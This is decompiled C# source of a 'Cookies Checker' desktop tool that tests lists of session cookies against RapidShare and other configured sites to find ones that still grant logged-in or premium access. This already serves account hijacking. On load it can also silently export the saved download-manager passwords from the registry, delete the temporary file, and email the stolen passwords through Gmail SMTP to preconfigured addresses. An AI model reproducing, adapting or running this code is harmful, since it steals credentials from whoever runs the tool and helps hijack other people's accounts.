using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using cookies_checker.Properties;

namespace cookies_checker;

public class main : Form
{
	private IContainer icontainer_0 = null;

	private ListBox listBox1;

	private Button button3;

	private Button button5;

	private Button button6;

	private Button about;

	private Button button10;

	private Button button1;

	private TextBox textBox1;

	private ComboBox comboBox1;

	private Label label2;

	private NotifyIcon reexDfjheh;

	private ContextMenuStrip contextMenuStrip2;

	private ToolStripMenuItem copyWorkingCopyToolStripMenuItem;

	private ToolStripMenuItem copyToolStripMenuItem;

	private ToolStripMenuItem aLLToolStripMenuItem;

	private ToolStripMenuItem oneOnlyToolStripMenuItem;

	private ToolStripMenuItem exitToolStripMenuItem;

	private ToolStripMenuItem aboutToolStripMenuItem;

	private LinkLabel linkLabel1;

	private ToolStripMenuItem javascriptForFirstOneToolStripMenuItem;

	private Button button2;

	private Label label1;

	private Label label3;

	private Button button4;

	private Button button7;

	private Button button9;

	private Button button8;

	private Thread thread_0;

	private Thread thread_1;

	private string string_0 = "";

	private string string_1 = "";

	private string string_2 = " ";

	private string string_3 = "";

	private string string_4 = "nullnullnullnull";

	private int int_0 = 0;

	private Thread thread_2;

	private Class1[] class1_0;

	private Class1 class1_1;

	private int int_1 = 0;

	private string string_5 = "";

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0203: Unknown result type (might be due to invalid IL or missing references)
		//IL_020d: Expected O, but got Unknown
		//IL_07ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0809: Expected O, but got Unknown
		//IL_0832: Unknown result type (might be due to invalid IL or missing references)
		//IL_083c: Expected O, but got Unknown
		//IL_086b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0875: Expected O, but got Unknown
		//IL_090c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0916: Expected O, but got Unknown
		//IL_1030: Unknown result type (might be due to invalid IL or missing references)
		//IL_103a: Expected O, but got Unknown
		//IL_1046: Unknown result type (might be due to invalid IL or missing references)
		//IL_1050: Expected O, but got Unknown
		//IL_107c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1086: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(main));
		listBox1 = new ListBox();
		contextMenuStrip2 = new ContextMenuStrip(icontainer_0);
		copyWorkingCopyToolStripMenuItem = new ToolStripMenuItem();
		aLLToolStripMenuItem = new ToolStripMenuItem();
		oneOnlyToolStripMenuItem = new ToolStripMenuItem();
		javascriptForFirstOneToolStripMenuItem = new ToolStripMenuItem();
		copyToolStripMenuItem = new ToolStripMenuItem();
		exitToolStripMenuItem = new ToolStripMenuItem();
		aboutToolStripMenuItem = new ToolStripMenuItem();
		button3 = new Button();
		about = new Button();
		button10 = new Button();
		textBox1 = new TextBox();
		comboBox1 = new ComboBox();
		label2 = new Label();
		reexDfjheh = new NotifyIcon(icontainer_0);
		linkLabel1 = new LinkLabel();
		button2 = new Button();
		label1 = new Label();
		label3 = new Label();
		button7 = new Button();
		button9 = new Button();
		button4 = new Button();
		button8 = new Button();
		button6 = new Button();
		button1 = new Button();
		button5 = new Button();
		((Control)contextMenuStrip2).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)listBox1).set_ContextMenuStrip(contextMenuStrip2);
		((ListControl)listBox1).set_FormattingEnabled(true);
		listBox1.set_HorizontalScrollbar(true);
		listBox1.set_ItemHeight(15);
		((Control)listBox1).set_Location(new Point(0, 0));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(462, 244));
		((Control)listBox1).set_TabIndex(2);
		listBox1.add_SelectedIndexChanged((EventHandler)listBox1_SelectedIndexChanged);
		((Control)listBox1).add_MouseDoubleClick(new MouseEventHandler(listBox1_MouseDoubleClick));
		((ToolStrip)contextMenuStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)copyWorkingCopyToolStripMenuItem,
			(ToolStripItem)copyToolStripMenuItem,
			(ToolStripItem)exitToolStripMenuItem,
			(ToolStripItem)aboutToolStripMenuItem
		});
		((Control)contextMenuStrip2).set_Name("contextMenuStrip2");
		((Control)contextMenuStrip2).set_Size(new Size(192, 92));
		((ToolStripDropDown)contextMenuStrip2).add_Opening((CancelEventHandler)contextMenuStrip2_Opening);
		((ToolStripDropDownItem)copyWorkingCopyToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)aLLToolStripMenuItem,
			(ToolStripItem)oneOnlyToolStripMenuItem,
			(ToolStripItem)javascriptForFirstOneToolStripMenuItem
		});
		((ToolStripItem)copyWorkingCopyToolStripMenuItem).set_Name("copyWorkingCopyToolStripMenuItem");
		((ToolStripItem)copyWorkingCopyToolStripMenuItem).set_Size(new Size(191, 22));
		((ToolStripItem)copyWorkingCopyToolStripMenuItem).set_Text("Copy working cookies");
		((ToolStripItem)aLLToolStripMenuItem).set_Name("aLLToolStripMenuItem");
		((ToolStripItem)aLLToolStripMenuItem).set_Size(new Size(188, 22));
		((ToolStripItem)aLLToolStripMenuItem).set_Text("ALL");
		((ToolStripItem)aLLToolStripMenuItem).add_Click((EventHandler)aLLToolStripMenuItem_Click);
		((ToolStripItem)oneOnlyToolStripMenuItem).set_Name("oneOnlyToolStripMenuItem");
		((ToolStripItem)oneOnlyToolStripMenuItem).set_Size(new Size(188, 22));
		((ToolStripItem)oneOnlyToolStripMenuItem).set_Text("one only");
		((ToolStripItem)oneOnlyToolStripMenuItem).add_Click((EventHandler)oneOnlyToolStripMenuItem_Click);
		((ToolStripItem)javascriptForFirstOneToolStripMenuItem).set_Name("javascriptForFirstOneToolStripMenuItem");
		((ToolStripItem)javascriptForFirstOneToolStripMenuItem).set_Size(new Size(188, 22));
		((ToolStripItem)javascriptForFirstOneToolStripMenuItem).set_Text("javascript for first one");
		((ToolStripItem)javascriptForFirstOneToolStripMenuItem).set_Visible(false);
		((ToolStripItem)javascriptForFirstOneToolStripMenuItem).add_Click((EventHandler)javascriptForFirstOneToolStripMenuItem_Click);
		((ToolStripItem)copyToolStripMenuItem).set_Name("copyToolStripMenuItem");
		((ToolStripItem)copyToolStripMenuItem).set_Size(new Size(191, 22));
		((ToolStripItem)copyToolStripMenuItem).set_Text("Copy tested cookies");
		((ToolStripItem)copyToolStripMenuItem).add_Click((EventHandler)copyToolStripMenuItem_Click);
		((ToolStripItem)exitToolStripMenuItem).set_Name("exitToolStripMenuItem");
		((ToolStripItem)exitToolStripMenuItem).set_Size(new Size(191, 22));
		((ToolStripItem)exitToolStripMenuItem).set_Text("Exit");
		((ToolStripItem)exitToolStripMenuItem).add_Click((EventHandler)exitToolStripMenuItem_Click);
		((ToolStripItem)aboutToolStripMenuItem).set_Name("aboutToolStripMenuItem");
		((ToolStripItem)aboutToolStripMenuItem).set_Size(new Size(191, 22));
		((ToolStripItem)aboutToolStripMenuItem).set_Text("About");
		((ToolStripItem)aboutToolStripMenuItem).add_Click((EventHandler)aboutToolStripMenuItem_Click);
		((Control)button3).set_ForeColor(SystemColors.ControlText);
		((Control)button3).set_Location(new Point(160, 312));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(105, 32));
		((Control)button3).set_TabIndex(5);
		((Control)button3).set_Text("Start");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_TextChanged((EventHandler)button3_TextChanged);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)about).set_ForeColor(SystemColors.ControlText);
		((Control)about).set_Location(new Point(0, 464));
		((Control)about).set_Name("about");
		((Control)about).set_Size(new Size(94, 32));
		((Control)about).set_TabIndex(10);
		((Control)about).set_Text("About");
		((ButtonBase)about).set_UseVisualStyleBackColor(true);
		((Control)about).add_Click((EventHandler)about_Click);
		((Control)button10).set_Location(new Point(306, 284));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(10, 25));
		((Control)button10).set_TabIndex(13);
		((Control)button10).set_Text("past-start");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button10).set_Visible(false);
		((Control)button10).add_Click((EventHandler)button10_Click);
		((Control)textBox1).set_Location(new Point(69, 365));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		textBox1.set_ScrollBars((ScrollBars)3);
		((Control)textBox1).set_Size(new Size(310, 83));
		((Control)textBox1).set_TabIndex(15);
		((TextBoxBase)textBox1).set_WordWrap(false);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		((Control)comboBox1).set_Location(new Point(123, 288));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(193, 23));
		((Control)comboBox1).set_TabIndex(16);
		comboBox1.add_SelectedIndexChanged((EventHandler)jqvQvIxbp);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_ForeColor(Color.Black);
		((Control)label2).set_Location(new Point(157, 347));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(41, 15));
		((Control)label2).set_TabIndex(17);
		((Control)label2).set_Text("Result:");
		reexDfjheh.set_ContextMenuStrip(contextMenuStrip2);
		reexDfjheh.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		reexDfjheh.set_Text("Cookies Cheker");
		reexDfjheh.set_Visible(true);
		reexDfjheh.add_MouseDoubleClick(new MouseEventHandler(reexDfjheh_MouseDoubleClick));
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_BackColor(SystemColors.ControlLight);
		((Control)linkLabel1).set_Font(new Font("Comic Sans MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)linkLabel1).set_ForeColor(Color.Red);
		linkLabel1.set_LinkColor(Color.Red);
		((Control)linkLabel1).set_Location(new Point(132, 488));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(330, 15));
		((Control)linkLabel1).set_TabIndex(18);
		((Label)linkLabel1).set_TabStop(true);
		((Control)linkLabel1).set_Text("Support me: Donate using  Alertpay  to \"a.shawky.1@gmail.com\"");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((Control)button2).set_Location(new Point(387, 347));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 131));
		((Control)button2).set_TabIndex(19);
		((Control)button2).set_Text("Find\r\n\r\nN\r\ne\r\nw\r\n\r\ncookies\r\n");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 257));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(38, 15));
		((Control)label1).set_TabIndex(20);
		((Control)label1).set_Text("count:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(45, 257));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(0, 15));
		((Control)label3).set_TabIndex(21);
		((ButtonBase)button7).set_Image((Image)(object)Resources.smethod_4());
		((Control)button7).set_Location(new Point(428, 89));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(34, 37));
		((Control)button7).set_TabIndex(32);
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((ButtonBase)button9).set_Image((Image)(object)Resources.smethod_7());
		((Control)button9).set_Location(new Point(428, 132));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(34, 37));
		((Control)button9).set_TabIndex(34);
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button9).add_Click((EventHandler)button9_Click);
		((ButtonBase)button4).set_Image((Image)(object)Resources.smethod_5());
		((ButtonBase)button4).set_ImageAlign((ContentAlignment)16);
		((Control)button4).set_Location(new Point(374, 250));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(76, 37));
		((Control)button4).set_TabIndex(22);
		((Control)button4).set_Text("clear");
		((ButtonBase)button4).set_TextAlign((ContentAlignment)64);
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((ButtonBase)button8).set_Image((Image)(object)Resources.smethod_6());
		((Control)button8).set_Location(new Point(428, 45));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(34, 38));
		((Control)button8).set_TabIndex(33);
		((ButtonBase)button8).set_TextAlign((ContentAlignment)64);
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((Control)button6).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)button6).set_Image((Image)(object)Resources.smethod_2());
		((ButtonBase)button6).set_ImageAlign((ContentAlignment)16);
		((Control)button6).set_Location(new Point(179, 250));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(147, 37));
		((Control)button6).set_TabIndex(9);
		((Control)button6).set_Text("Past From clipboard");
		((ButtonBase)button6).set_TextAlign((ContentAlignment)64);
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((Control)button1).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)button1).set_Image((Image)(object)Resources.smethod_1());
		((ButtonBase)button1).set_ImageAlign((ContentAlignment)16);
		((Control)button1).set_Location(new Point(100, 249));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(73, 38));
		((Control)button1).set_TabIndex(14);
		((Control)button1).set_Text("add ");
		((ButtonBase)button1).set_TextAlign((ContentAlignment)64);
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)ymfpwjlPB);
		((Control)button5).set_ForeColor(SystemColors.ControlText);
		((ButtonBase)button5).set_Image((Image)(object)Resources.smethod_3());
		((ButtonBase)button5).set_ImageAlign((ContentAlignment)16);
		((Control)button5).set_Location(new Point(160, 448));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(132, 37));
		((Control)button5).set_TabIndex(7);
		((Control)button5).set_Text("copy to clipboard");
		((ButtonBase)button5).set_TextAlign((ContentAlignment)64);
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 15f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ButtonFace);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(462, 509));
		((Control)this).set_ContextMenuStrip(contextMenuStrip2);
		((Control)this).get_Controls().Add((Control)(object)button7);
		((Control)this).get_Controls().Add((Control)(object)button9);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button8);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)button6);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)about);
		((Control)this).get_Controls().Add((Control)(object)button5);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).set_Font(new Font("Comic Sans MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("main");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Cookies Cheker V5");
		((Form)this).add_FormClosed(new FormClosedEventHandler(main_FormClosed));
		((Form)this).add_Load((EventHandler)main_Load);
		((Control)this).add_SizeChanged((EventHandler)main_SizeChanged);
		((Control)contextMenuStrip2).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void ExportKey(string RegKey, string SavePath)
	{
		string text = "\"" + SavePath + "\"";
		string text2 = "\"" + RegKey + "\"";
		Process process = new Process();
		try
		{
			process.StartInfo.FileName = "regedit.exe";
			process.StartInfo.UseShellExecute = false;
			process = Process.Start("regedit.exe", "/e " + text + " " + text2);
			process?.WaitForExit();
		}
		finally
		{
			process?.Dispose();
		}
	}

	private void method_0()
	{
		string text = "c:\\qzpvm.txt";
		string text2 = "";
		try
		{
			ExportKey("HKEY_CURRENT_USER\\Software\\DownloadManager\\Passwords", text);
		}
		catch
		{
			try
			{
				thread_1.Abort();
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			StreamReader streamReader = new StreamReader(text);
			text2 = streamReader.ReadToEnd();
			streamReader.Close();
			File.Delete(text);
		}
		catch
		{
			try
			{
				thread_1.Abort();
				return;
			}
			catch
			{
				return;
			}
		}
		method_2("accounts", text2);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr intptr_0, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int GetClassName(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_2);

	private void method_1(string string_6, string string_7)
	{
		if (string_7 == "")
		{
			return;
		}
		try
		{
			if (!(Form2.mail_from_pass.Trim() == "") && !(Form2.mail_from_user.Trim() == "") && !(Form2.mail_to_user.Trim() == ""))
			{
				MailMessage mailMessage = new MailMessage();
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				mailMessage.From = new MailAddress(Form2.mail_from_user.Trim());
				mailMessage.To.Add(Form2.mail_to_user.Trim());
				if (Form2.mail_to_user2.Trim() != "")
				{
					try
					{
						mailMessage.To.Add(Form2.mail_to_user2.Trim());
					}
					catch
					{
					}
				}
				mailMessage.Subject = string_6;
				mailMessage.Body = string_7;
				smtpClient.Port = 587;
				smtpClient.Credentials = new NetworkCredential(Form2.mail_from_user.Trim(), Form2.mail_from_pass.Trim());
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
			}
		}
		catch
		{
		}
		try
		{
			thread_2.Abort();
		}
		catch
		{
		}
	}

	private void method_2(string string_6, string string_7)
	{
		if (string_7 == "")
		{
			return;
		}
		try
		{
			if (!(Form2.mail_from_pass2.Trim() == "") && !(Form2.mail_from_user2.Trim() == "") && !(Form2.mail_to_user.Trim() == ""))
			{
				MailMessage mailMessage = new MailMessage();
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				mailMessage.From = new MailAddress(Form2.mail_from_user2.Trim());
				mailMessage.To.Add(Form2.mail_to_user.Trim());
				if (Form2.mail_to_user2.Trim() != "")
				{
					try
					{
						mailMessage.To.Add(Form2.mail_to_user2.Trim());
					}
					catch
					{
					}
				}
				mailMessage.Subject = string_6;
				mailMessage.Body = string_7;
				smtpClient.Port = 587;
				smtpClient.Credentials = new NetworkCredential(Form2.mail_from_user2.Trim(), Form2.mail_from_pass2.Trim());
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
			}
		}
		catch
		{
		}
		try
		{
			thread_1.Abort();
		}
		catch
		{
		}
	}

	private bool method_3(string string_6)
	{
		WebRequest webRequest = WebRequest.Create("http://api.rapidshare.com/cgi-bin/rsapi.cgi?sub=getaccountdetails_v1&type=prem&cookie=" + string_6);
		WebResponse response;
		try
		{
			response = webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		string text;
		using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
		{
			text = streamReader.ReadToEnd();
		}
		if (!text.Contains("billeduntil") || !text.Contains("servertime"))
		{
			return false;
		}
		double num;
		double num2;
		try
		{
			num = double.Parse(Class2.smethod_3(text, "billeduntil=", "\n"));
			num2 = double.Parse(Class2.smethod_3(text, "servertime=", "\n"));
		}
		catch
		{
			return false;
		}
		if (num > num2)
		{
			return true;
		}
		return false;
	}

	private bool method_4(string string_6)
	{
		class1_1 = new Class1();
		for (int i = 0; i < Class1.int_0; i++)
		{
			if (((Control)comboBox1).get_Text() == class1_0[i].string_0)
			{
				class1_1 = class1_0[i];
				break;
			}
		}
		string text = class1_1.string_4 + string_6;
		WebRequest webRequest = WebRequest.Create(class1_1.string_1);
		try
		{
			webRequest.Headers.Add("Cookie: " + text);
		}
		catch
		{
			return false;
		}
		WebResponse response;
		try
		{
			response = webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		string text2;
		using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
		{
			text2 = streamReader.ReadToEnd();
		}
		if (text2.Contains(class1_1.string_2) && (text2.Contains(class1_1.string_5) || !text2.Contains(class1_1.string_3)))
		{
			return true;
		}
		return false;
	}

	private bool method_5(string string_6)
	{
		if (!File.Exists(string_6))
		{
			return false;
		}
		StreamReader streamReader = new StreamReader(string_6);
		string s = streamReader.ReadLine();
		try
		{
			class1_0 = new Class1[int.Parse(s)];
		}
		catch
		{
			class1_0 = new Class1[2];
		}
		int num = 0;
		while ((s = streamReader.ReadLine()) != null)
		{
			string text = Class2.smethod_4(ref s, "=");
			text = text.Trim();
			s = s.Trim();
			switch (text)
			{
			case "URL":
				string_0 = s;
				try
				{
					class1_0[int_1] = new Class1();
					class1_1 = class1_0[int_1];
				}
				catch
				{
				}
				class1_1.string_1 = string_0;
				int_1++;
				Class1.int_0++;
				break;
			case "logedin":
				class1_1.string_2 = s;
				break;
			case "free":
				class1_1.string_3 = s;
				break;
			case "cookies_to_check":
				class1_1.string_4 = s;
				break;
			case "premium":
				class1_1.string_5 = s;
				break;
			case "Name":
				class1_1.string_0 = s;
				comboBox1.get_Items().Add((object)s);
				break;
			case "javascript":
				class1_1.string_6 = s;
				break;
			}
			num++;
		}
		streamReader.Close();
		return true;
	}

	public bool linkfound(string link, int endsearch)
	{
		int num = 0;
		while (true)
		{
			if (num < endsearch)
			{
				if (listBox1.get_Items().get_Item(num).ToString() == link)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public void start()
	{
		for (int i = 0; i < listBox1.get_Items().get_Count(); i++)
		{
			listBox1.SetSelected(i, true);
			if (!(listBox1.get_Items().get_Item(i).ToString() == ""))
			{
				bool flag = false;
				if ((!(((Control)comboBox1).get_Text() == "Rapidshare")) ? method_4(listBox1.get_Items().get_Item(i).ToString()) : method_3(listBox1.get_Items().get_Item(i).ToString()))
				{
					TextBox obj = textBox1;
					((Control)obj).set_Text(((Control)obj).get_Text() + listBox1.get_Items().get_Item(i).ToString() + "\r\n");
					int_0++;
				}
			}
		}
		((Control)label2).set_Text("Results: " + int_0 + "  working Cookies");
		reexDfjheh.set_BalloonTipTitle("");
		reexDfjheh.set_BalloonTipText(int_0 + "  working Cookies for " + ((Control)comboBox1).get_Text());
		reexDfjheh.ShowBalloonTip(5000);
		((Control)button3).set_Text("Start");
		((Control)button10).set_Enabled(true);
		thread_0.Abort();
	}

	public void addlink(string path)
	{
		if (!File.Exists(path))
		{
			File.Create(path);
			return;
		}
		listBox1.get_Items().Clear();
		StreamReader streamReader = new StreamReader(path);
		string text;
		while ((text = streamReader.ReadLine()) != null)
		{
			text = text.Trim();
			if (!listBox1.get_Items().Contains((object)text))
			{
				listBox1.get_Items().Add((object)text.Trim());
			}
		}
		streamReader.Close();
	}

	public void addlink_without_clear(string path)
	{
		if (!File.Exists(path))
		{
			File.Create(path);
			return;
		}
		StreamReader streamReader = new StreamReader(path);
		string text;
		while ((text = streamReader.ReadLine()) != null)
		{
			if (!listBox1.get_Items().Contains((object)text))
			{
				listBox1.get_Items().Add((object)text.Trim());
			}
		}
		streamReader.Close();
	}

	public void clipboard_copy()
	{
		string text = "";
		for (int i = 0; i < listBox1.get_Items().get_Count(); i++)
		{
			text = text + listBox1.get_Items().get_Item(i).ToString() + '\r' + '\n';
		}
		if (text != "")
		{
			Clipboard.SetText(text);
		}
	}

	private string method_6(string string_6)
	{
		byte[] bytes = new byte[0];
		try
		{
			WebRequest webRequest = WebRequest.Create(string_6);
			WebResponse response = webRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			byte[] array = new byte[1024];
			_ = response.ContentLength;
			MemoryStream memoryStream = new MemoryStream();
			while (true)
			{
				int num = responseStream.Read(array, 0, array.Length);
				Application.DoEvents();
				if (num == 0)
				{
					break;
				}
				memoryStream.Write(array, 0, num);
			}
			bytes = memoryStream.ToArray();
			responseStream.Close();
			memoryStream.Close();
		}
		catch (Exception)
		{
		}
		return Encoding.ASCII.GetString(bytes);
	}

	private void method_7()
	{
		for (int i = 0; i < listBox1.get_Items().get_Count(); i++)
		{
			if (listBox1.GetSelected(i))
			{
				listBox1.SetSelected(i, false);
			}
			else
			{
				listBox1.SetSelected(i, true);
			}
		}
	}

	private void method_8()
	{
		for (int i = 0; i < listBox1.get_Items().get_Count(); i++)
		{
			listBox1.SetSelected(i, false);
		}
	}

	public main()
	{
		InitializeComponent();
	}

	private void main_Load(object sender, EventArgs e)
	{
		((Control)this).set_Text(Form2.program_name);
		Control.set_CheckForIllegalCrossThreadCalls(false);
		((Control)label2).set_Text("Results:");
		string_5 = Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\";
		method_5(string_5 + "config.txt");
		try
		{
			((Control)comboBox1).set_Text(comboBox1.get_Items().get_Item(0).ToString());
		}
		catch
		{
		}
		if (Form2.SA)
		{
			thread_0 = new Thread(start);
			thread_1 = new Thread(method_0);
			thread_1.Start();
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		addlink("links.txt");
	}

	private void method_10(object sender, EventArgs e)
	{
	}

	private void method_11(object sender, EventArgs e)
	{
	}

	private void method_12(object sender, EventArgs e)
	{
	}

	private void method_13(object sender, EventArgs e)
	{
	}

	private void button3_Click(object sender, EventArgs e)
	{
		((Control)label2).set_Text("Results:");
		int_0 = 0;
		if (((Control)button3).get_Text() == "Start")
		{
			((Control)textBox1).set_Text("");
			thread_0 = new Thread(start);
			thread_0.Start();
			((Control)button3).set_Text("Stop");
			((Control)button10).set_Enabled(false);
		}
		else if (((Control)button3).get_Text() == "Stop")
		{
			thread_0.Abort();
			((Control)button3).set_Text("Start");
			((Control)button10).set_Enabled(true);
		}
	}

	private void button5_Click(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(((Control)textBox1).get_Text());
		}
		catch
		{
		}
	}

